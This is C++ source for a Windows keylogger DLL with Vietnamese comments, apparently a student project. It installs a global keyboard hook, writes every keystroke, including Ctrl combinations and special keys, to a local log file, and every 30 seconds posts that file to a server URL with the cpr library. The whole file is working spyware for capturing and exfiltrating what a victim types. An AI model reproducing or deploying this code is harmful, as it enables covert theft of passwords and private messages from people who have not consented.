
#include "pch.h"
#include <Windows.h>
#include <string>
#include <fstream>
#include<cpr/cpr.h>
#include<ctime>
using namespace std;
using namespace cpr;

// dinh nghia bien,tham so
HHOOK hGlobalHook = NULL;
ofstream file;

string url = "http://localhost/"; 
int space_time_send = 30;  // khoang thoi gian gui len server (giay)
string pathFile = "D:/Truong/DaMang/keylog.text";  // tham so cho cpr
string path = "D:\\Truong\\DaMang\\keylog.text";  // tham so cho doc ghi file

// dinh nghia ham doc ghi file
void WriteStringToFile(string str, int &t0);
void WriteEnterToFile(int &t0);

extern "C" __declspec(dllexport) LRESULT LogKeyboard(int nCode, WPARAM wParam, LPARAM lParam , int t0)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        WORD w;
        time_t t = time(0);
        static int t0 = int(t);  // time khoi tao khi bat dau nhan phim

        bool isDownShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
        bool isDownCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
        bool isDownCtrl = ((GetKeyState(VK_CONTROL) & 0x80) == 0x80 ? true : false);
        BYTE keyState[256];
        GetKeyboardState(keyState);
        
        KBDLLHOOKSTRUCT* keycode = (KBDLLHOOKSTRUCT*)lParam;

        if (keycode->vkCode == VK_BACK)
            WriteStringToFile("/Backspace/",t0);
        if (keycode->vkCode == VK_DELETE)
            WriteStringToFile("/Delete/",t0);
        if (keycode->vkCode == VK_RETURN)
        {
            WriteEnterToFile(t0);
            WriteStringToFile("/Enter/",t0);
        }
        if (keycode->vkCode == VK_HOME)
            WriteStringToFile("/Home/",t0);
        if (keycode->vkCode == VK_END)
            WriteStringToFile("/End/",t0);
        if (keycode->vkCode == VK_LEFT)
            WriteStringToFile("/Left/",t0);
        if (keycode->vkCode == VK_RIGHT)
            WriteStringToFile("/Right/",t0);
        if (keycode->vkCode == VK_DOWN)
            WriteStringToFile("/Down/",t0);
        if (keycode->vkCode == VK_UP)
            WriteStringToFile("/Up/",t0);
        if (keycode->vkCode == VK_INSERT) {
            WriteStringToFile("/Ins/", t0);
        }
       
        else if (ToAscii(keycode->vkCode, keycode->scanCode, keyState, &w, keycode->flags) == 1)
        {
            char key = char(w);
            if ((isDownCapslock ^ isDownShift) && ((key >= 65 && key <= 90) || (key >= 97 && key <= 122)))
            {
                key = toupper(key);
            }
            if (isDownCtrl)
            {
                char str[30];
                sprintf_s(str, "{Ctrl - %c}", (char)keycode->vkCode);
                WriteStringToFile(str,t0);
            }
            else
            {
                char str[30];
                sprintf_s(str, "%c", key);
                WriteStringToFile(str,t0);
            }
        }
    }
    return CallNextHookEx(hGlobalHook, nCode, wParam, lParam);
}

extern "C" __declspec (dllexport) void SetGlobalHook(HHOOK hHook) {
    hGlobalHook = hHook;
}
// gui file den server su dung lib cur
void sendFiletoServer(int &t0) {
    time_t now = time(0);
    int t_now = int(now);
    if (t_now - t0 >= space_time_send) {
        try
        {
            Response r = Post(Url{ url },
                Multipart{ {"keylog", File{pathFile}} });
        }
        catch (const exception&)
        {
        }
        t0 = t_now;
    }
    
}
void WriteStringToFile(string str,int &t0) {
    file.open(path, ios_base::app);
    file << str;
    sendFiletoServer(t0);
    remove(path.c_str());
    file.close();

}
void WriteEnterToFile(int &t0) {
    file.open(path, ios_base::app);
    file << "\n";
    sendFiletoServer(t0);
    remove(path.c_str());
    file.close();
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

